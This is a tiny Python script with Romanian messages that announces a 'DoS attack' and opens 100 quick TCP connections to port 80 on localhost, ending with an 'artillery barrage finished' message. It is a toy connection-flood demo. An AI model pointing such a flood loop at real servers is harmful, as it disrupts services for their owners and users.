import socket

tinta = "127.0.0.1"
port_tinta = 80

print(f"[*] Lansăm atacul DoS către {tinta}...")

for i in range(100):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.01)
        s.connect((tinta, port_tinta))
        s.close()
    except:
        pass

print("[+] Baraj de artilerie finalizat!")